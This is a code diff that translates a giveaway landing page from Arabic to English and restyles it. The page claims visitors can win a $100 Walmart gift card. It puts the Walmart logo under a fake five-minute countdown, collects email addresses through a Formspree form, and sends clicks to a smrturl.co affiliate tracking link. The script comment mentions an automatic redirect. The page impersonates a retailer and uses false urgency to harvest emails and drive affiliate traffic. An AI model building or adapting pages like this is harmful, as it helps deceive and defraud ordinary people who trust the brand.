@@ -1,67 +1,89 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>اربح بطاقة Walmart بقيمة 100$</title>
+  <title>Win a $100 Walmart Gift Card</title>
   <style>
     body {
-      background: #f2f2f2;
-      font-family: 'Tahoma', sans-serif;
       margin: 0;
-      padding: 0;
+      font-family: 'Arial', sans-serif;
+      background: linear-gradient(135deg, #fefefe, #e0f0ff);
+      background-image: url('https://i.imgur.com/3Zl4z2q.png');
+      background-repeat: repeat;
+      background-size: contain;
+    }
+    .overlay {
+      background-color: rgba(255, 255, 255, 0.95);
+      min-height: 100vh;
+      padding: 40px 20px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
     }
     .container {
+      background: #ffffff;
       max-width: 500px;
-      margin: 30px auto;
-      background: #fff;
-      padding: 25px;
-      border-radius: 15px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      padding: 30px;
+      border-radius: 20px;
+      box-shadow: 0 0 25px rgba(0, 0, 0, 0.1);
       text-align: center;
+      position: relative;
     }
-    img {
-      max-width: 200px;
-      margin-bottom: 20px;
+    .walmart-logo {
+      width: 100px;
+      position: absolute;
+      top: -50px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: white;
+      padding: 10px;
+      border-radius: 50%;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
     }
     h1 {
-      font-size: 22px;
-      color: #222;
+      font-size: 24px;
+      color: #0a3d62;
+      margin-top: 60px;
     }
     p {
-      color: #555;
+      color: #34495e;
       font-size: 16px;
       margin-bottom: 20px;
     }
     .countdown {
       font-size: 22px;
       font-weight: bold;
-      color: #d9534f;
-      margin-bottom: 25px;
+      color: #e74c3c;
+      margin-bottom: 20px;
     }
     input[type="email"] {
-      padding: 12px;
       width: 90%;
-      border: 1px solid #ccc;
+      padding: 12px;
+      font-size: 16px;
       border-radius: 8px;
+      border: 1px solid #ccc;
       margin-bottom: 15px;
     }
     button, .cta-button {
-      background-color: #007bff;
+      background: #0078d7;
       color: white;
-      padding: 12px 20px;
+      padding: 12px 24px;
       font-size: 18px;
       border: none;
       border-radius: 8px;
       cursor: pointer;
       text-decoration: none;
+      transition: 0.3s;
+      display: inline-block;
+      margin: 5px auto;
     }
     button:hover, .cta-button:hover {
-      background-color: #0056b3;
+      background: #0056a8;
     }
     @media (max-width: 600px) {
       .container {
-        padding: 15px;
+        padding: 20px;
       }
       h1 {
         font-size: 20px;
@@ -71,27 +93,30 @@
 </head>
 <body>
 
-  <div class="container">
-    <img src="https://1000logos.net/wp-content/uploads/2017/05/Walmart-logo.png" alt="Walmart Logo" />
-    <h1>احصل على بطاقة Walmart بقيمة 100 دولار!</h1>
-    <p>سجل بريدك الإلكتروني الآن وادخل السحب قبل انتهاء الوقت.</p>
+  <div class="overlay">
+    <div class="container">
+      <img src="https://1000logos.net/wp-content/uploads/2017/05/Walmart-logo.png" alt="Walmart Logo" class="walmart-logo">
 
-    <div class="countdown" id="timer">05:00</div>
+      <h1>Win a $100 Walmart Gift Card!</h1>
+      <p>Enter your email now for a chance to win before the timer runs out!</p>
 
-    <form action="https://formspree.io/f/xeokykrv" method="POST">
-      <input type="email" name="email" placeholder="أدخل بريدك الإلكتروني" required />
-      <br>
-      <button type="submit">سجّل الآن</button>
-    </form>
+      <div class="countdown" id="timer">05:00</div>
 
-    <p>أو يمكنك تخطي التسجيل مباشرة 👇</p>
-    <a class="cta-button" href="https://smrturl.co/a/s20ef9922df/13412?s1=landing" target="_blank">
-      احصل على العرض مباشرة
-    </a>
+      <form action="https://formspree.io/f/xeokykrv" method="POST">
+        <input type="email" name="email" placeholder="Enter your email" required />
+        <br>
+        <button type="submit">Sign Up</button>
+      </form>
+
+      <p>Or skip registration and go directly 👇</p>
+      <a class="cta-button" href="https://smrturl.co/a/s20ef9922df/13412?s1=creative" target="_blank">
+        Get the Offer Now
+      </a>
+    </div>
   </div>
 
   <script>
-    // عدّ تنازلي وتحويل تلقائي
+    // Countdown and redirect
     let minutes = 5;
     let seconds = 0;
     const timerElement = document.getElementById("timer");
